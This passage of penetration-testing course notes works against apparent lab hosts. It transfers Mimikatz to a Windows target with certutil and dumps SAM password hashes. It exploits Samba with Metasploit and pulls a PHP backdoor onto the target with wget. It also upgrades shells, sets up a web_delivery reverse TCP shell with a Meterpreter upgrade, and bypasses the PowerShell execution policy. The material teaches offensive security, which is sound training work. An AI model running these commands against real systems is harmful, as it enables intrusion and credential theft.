cd /usr/share/windows-resources/mimikatz/x64/  
python3 -m http.server 80
```

This serves the **Mimikatz** executable over HTTP from the `/usr/share/windows-resources/mimikatz/x64/` directory.

---

**10. Preparing the Target (Creating a Temp Directory)**

On the target machine (via the shell obtained from the exploit), create a new temporary directory to store and execute `mimikatz.exe`:

```
cd C:\  
mkdir Temp  
cd Temp
```

This will create and navigate to the `Temp` directory on the `C:` drive.

---

**11. Downloading Mimikatz on the Target**

Using `certutil`, download `mimikatz.exe` from your Kali machine to the target system:

```
certutil -urlcache -f http://eth1/mimikatz.exe mimikatz.exe
```

Replace `eth1` with the IP address of your Kali Linux machine.

This command fetches `mimikatz.exe` from your HTTP server and saves it in the current directory on the target.

---

**12. Running Mimikatz**

Verify the download by listing the contents of the current directory:

```
dir
```

Now, execute `mimikatz`:

```
.\mimikatz.exe
```

---

**13. Dumping Credentials**

Once inside **Mimikatz**, enable debug privileges with the following command:

```
privilege::debug
```

Next, dump the **SAM database** (Security Account Manager) to retrieve hashed credentials:

```
lsadump::sam
```

This will dump the hashed passwords stored in the SAM database.

---

**14. Exiting Mimikatz**

After dumping the credentials, exit **Mimikatz**:

```
exit
```

---

**15. Example of File Transfer via Certutil**

Here’s an additional example of how to transfer files to the target using `certutil`. First, set up an HTTP server to serve the file:

```
python3 -m http.server 80
```

Then, on the target machine, use `certutil` to download a file (e.g., `test.txt`):

```
certutil -urlcache -f http://eth1/test.txt test.txt
```

This will download the file `test.txt` from the web server running on your **Kali Linux** machine.


####  Conclusion

Following these steps, we exploited a vulnerable Windows service, transferred files using `certutil`, and extracted credentials using **Mimikatz**. Make sure to replace IP addresses and ports based on your specific network setup.

--

### Transferring Files To Linux Targets

This documentation outlines how to scan a Linux target, exploit it using Metasploit, and transfer files to the compromised system.

---

#### 1. Scanning the Target

We begin by scanning the target system to gather information about open services and their versions.

```bash
nmap -sV demo.ine.local
```

- `-sV`: This option enables version detection, helping identify what software is running on open ports.
- `demo.ine.local`: This is the target we are scanning.

---

#### 2. Using Tmux for Multiple Terminal Sessions

Since we need to work with multiple terminal sessions, we use **Tmux**, a terminal multiplexer, to manage multiple terminal windows efficiently within one session.

Start Tmux:

```bash
tmux
```

**Tmux shortcuts**:
- **CTRL + B + C**: Opens a new terminal window.
- **CTRL + B + Page Up/Page Down**: Allows you to scroll up or down in the terminal.
- **Q**: Exits scroll mode.

---

#### 3. Exploiting the Target Using Metasploit

We will use **Metasploit** to exploit the target. First, launch Metasploit:

```bash
msfconsole
```

Set the target's IP address globally using `setg`:

```bash
setg rhosts demo.ine.local
```

Search for Samba-related exploits (we assume the target has Samba vulnerabilities):

```bash
search samba
```

Select the appropriate Samba exploit module:

```bash
use exploit/linux/samba/is_known_pipename
```

Run the exploit to execute the attack:

```bash
run
```

After running the exploit, if successful, you should have a shell on the target. Spawn an interactive bash shell on the target system:

```bash
/bin/bash -i
```

Check the user privileges and system information:

```bash
id
```

Retrieve OS release information:

```bash
cat /etc/release
```

---

#### 4. Transferring Files to the Target System

Next, we will transfer a file to the compromised Linux target. To do this, we will set up a simple web server on our local machine to serve the file.

**Open a New Terminal Session:**

In Tmux, open a new terminal session:

```bash
CTRL + B + C
```

Navigate to the directory containing the file we want to transfer (in this case, a PHP backdoor):

```bash
cd /usr/share/webshells/php
```

Display the network interfaces to find our local IP address (we assume the interface is `eth1`):

```bash
ifconfig
```

Start a Python HTTP server to serve the PHP file:

```bash
python3 -m http.server 80
```

This will start a web server on port 80, allowing us to download the file from the target.

---

#### 5. Downloading the File on the Target

Now, switch back to the first terminal session (Tmux session 0):

```bash
CTRL + B + 0
```

On the target system (where we have a shell), download the PHP backdoor using `wget`:

```bash
wget http://eth1/php-backdoor.php
```

- Replace `eth1` with your actual interface if it's different.
- This command will fetch the PHP backdoor from our local machine to the target system.

---

### Summary

This guide covers:
- Scanning the target system using `nmap`.
- Using Tmux to manage multiple terminal sessions.
- Exploiting a Samba vulnerability using Metasploit.
- Setting up a Python HTTP server to serve files.
- Downloading files to the target system after exploitation.

This process allows you to successfully transfer files to a compromised Linux target after obtaining access.

--

## Upgrading Shells

### Upgrading Non-Interactive Shells (Demo)

This guide explains how to upgrade a non-interactive shell to a fully interactive one and ensure proper functionality by checking and setting environment variables.

---

#### 1. Exploiting the Target with Metasploit

We begin by using Metasploit to exploit the target system, which results in a non-interactive shell.

Start Metasploit:

```bash
msfconsole
```

Set the target's IP address globally:

```bash
setg rhosts demo.ine.local
```

Search for Samba-related exploits:

```bash
search samba
```

Select the Samba exploit module:

```bash
use exploit/linux/samba/is_known_pipename
```

Run the exploit:

```bash
run
```

---

#### 2. Dealing with a Non-Interactive Shell

After running the exploit, we obtained a non-interactive shell. Non-interactive shells do not provide full terminal functionality, making it harder to run complex commands or interact with programs that rely on a full terminal environment.

---

#### 3. Identifying Available Shells on the Target

We first check which shells are available on the target system by listing them:

```bash
cat /etc/shells
```

- The output will show the available shells (e.g., `/bin/bash`, `/bin/sh`, `/bin/zsh`). If Bash is available, we can attempt to upgrade our shell to an interactive Bash session.

If Bash is installed, we can spawn an interactive shell:

```bash
/bin/bash -i
```

Note: If Bash is not installed, you can try other shells like the Bourne shell (`/bin/sh`).

---

#### 4. Upgrading to a Fully Interactive Shell

##### Using Python

If Python is installed on the target system, we can upgrade to a pseudo-terminal (PTY) Bash session, which provides a more interactive shell.

First, check if Python is installed:

```bash
python --version
```

If Python is available, spawn a PTY Bash shell using the following command:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This command uses Python’s `pty` module to create a pseudo-terminal and attach it to a Bash shell.

##### Using Perl

If Python is not available but Perl is, you can spawn a Bash shell using Perl:

```bash
perl -e 'exec "/bin/bash";'
```

##### Using Ruby

Similarly, if Ruby is installed, you can use it to spawn a Bash shell:

```bash
ruby -e 'exec "/bin/bash"'
```

---

#### 5. Upgrading a Netcat Shell

If we obtain a shell session using Netcat, upgrading it to a Meterpreter session is not possible directly. Instead, we need to:
1. Generate a Meterpreter payload using **Msfvenom**.
2. Transfer the payload to the target.
3. Execute the payload on the target to upgrade the session.

---

#### 6. Ensuring a Fully Functional Interactive Shell

Once we’ve successfully upgraded to an interactive shell, it’s important to check and set the environment variables to ensure the shell operates correctly.

Check the current environment variables:

```bash
env
```

---

#### 7. Setting Essential Environment Variables

If the shell is not fully functional, we can manually set key environment variables to correct common issues:

Set the `PATH` variable to ensure system binaries are accessible:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Set the terminal type to `xterm`, which is required for most interactive terminal sessions:

```bash
export TERM=xterm
```

Set the shell to Bash:

```bash
export SHELL=bash
```

These environment variables will help ensure that the interactive shell behaves like a regular terminal, allowing for proper command execution and terminal-based interactions.

---

### Conclusion

This guide covers:
- Exploiting a system using Metasploit.
- Upgrading a non-interactive shell to an interactive one using various methods (Python, Perl, Ruby).
- Setting environment variables to ensure the shell functions as expected.

By following these steps, we can transform a basic non-interactive shell into a fully interactive environment suitable for further exploitation and administration tasks.

---

## Windows Privilege Escalation

### Identifying Windows Privilege Escalation Vulnerabilities

- In order to elevate our privileges on Windows, we must first, identify privilege escalation vulnerabilities that exist on the target system.
- This process will differ greatly based on the type of target we gain access to. Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system's unique configuration.
- This process can be quite tedious and time consuming and as a result, it is recommended to automate the processes of identifying privilege escalation vulnerabilities. This can be done through the use of various automation scripts.

#### PrivescCheck

- PrivescCheck - This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be usefulfor exploitation and/or post-exploitation.
- GitHub Repo: https://github.com/itm4n/PrivescCheck

### Demo: Identifying Windows Privilege Escalation Vulnerabilities

This demo walks through the steps to exploit a Windows system using Metasploit, gain a shell session, upgrade it to a Meterpreter session, and identify potential privilege escalation vulnerabilities.

---

#### 1. Setting Up the Exploit in Metasploit

Start Metasploit:

```bash
msfconsole
```

Search for the web delivery exploit module:

```bash
search web_delivery
```

Select the appropriate exploit module for multi-platform script delivery:

```bash
use exploit/multi/script/web_delivery
```

Display detailed information about the module:

```bash
show info
```

Set the target to PowerShell (PSH):

```bash
set target PSH
```

Alternatively, you can select the PowerShell (Binary) target:

```bash
set target PSH (Binary)
```

Set the payload to a reverse TCP shell for Windows:

```bash
set payload windows/shell/reverse_tcp
```

Disable PowerShell encoded commands for easier payload readability:

```bash
set PSH-EncodedCommand false
```

Set the attacker's IP address (in this case, the IP of the interface `eth1`):

```bash
set lhost eth1
```

Run the exploit:

```bash
run
```

---

#### 2. Executing the Payload on the Target System

After running the exploit, Metasploit will generate a PowerShell command. Copy this command and paste it into the Command Prompt (CMD) on the target system.

Once executed on the target, you should obtain a reverse command shell session on the attacker's machine.

Check the available sessions:

```bash
sessions
```

Verify your access by checking the current user and hostname:

```bash
whoami
hostname
```

---

#### 3. Upgrading the Shell to a Meterpreter Session

To take advantage of the full capabilities of Meterpreter, we upgrade the command shell to a Meterpreter session.

First, background the current shell session by pressing:

```bash
CTRL + Z
```

Search for the `shell_to_meterpreter` post-exploitation module:

```bash
search shell_to
```

Use the module to upgrade the session:

```bash
use post/multi/manage/shell_to_meterpreter
```

Set the attacker's IP address:

```bash
set lhost eth1
```

Specify the session ID you want to upgrade (e.g., session 1):

```bash
set session 1
```

Check the advanced options for the module:

```bash
show advanced
```

Set the file transfer method to VBS (Visual Basic Script):

```bash
set win_transfer VBS
```

Ensure that the `LPORT` (listening port) does not conflict with the port used by the current shell session.

Run the module to upgrade to a Meterpreter session:

```bash
run
```

You should now receive a Meterpreter session (e.g., session 2).

---

#### 4. Migrating to a 64-bit Process

Check system information:

```bash
sysinfo
```

If the current session is a 32-bit (x86) Meterpreter session and the system is 64-bit (x64), migrate to a 64-bit process (e.g., `explorer.exe`).

List the running processes:

```bash
ps
```

Identify the PID of a 64-bit process (e.g., `explorer.exe`) and migrate to it:

```bash
migrate 3624
```

Verify the current user identity:

```bash
getuid
```

List available privileges:

```bash
getprivs
```

---

#### 5. Navigating to the Privilege Escalation Check Tool

Navigate to the target directory where the privilege escalation check tool is located:

```bash
cd C:\
cd Users/student/Desktop/PrivescCheck
```

List the contents of the directory to ensure the tool is present:

```bash
dir
```

---

#### 6. Running PowerShell Scripts with Bypassed Execution Policy

To run PowerShell scripts, Windows has an execution policy that may prevent scripts from executing. To bypass this, use the following command:

```bash
powershell -ep bypass .\script.ps1
```

- `-ep bypass`: This option bypasses the PowerShell execution policy.
- `.\script.ps1`: Replace `script.ps1` with the name of the script you want to run.

---

### Conclusion

This demo covered:
- Setting up a reverse TCP shell exploit using Metasploit.
- Gaining a command shell session on a Windows target.
- Upgrading the shell session to a Meterpreter session.
- Migrating from a 32-bit to a 64-bit process.
- Running privilege escalation checks using PowerShell scripts.

By following these steps, you can efficiently identify privilege escalation vulnerabilities on a compromised Windows system and leverage the power of Meterpreter for advanced exploitation.

---


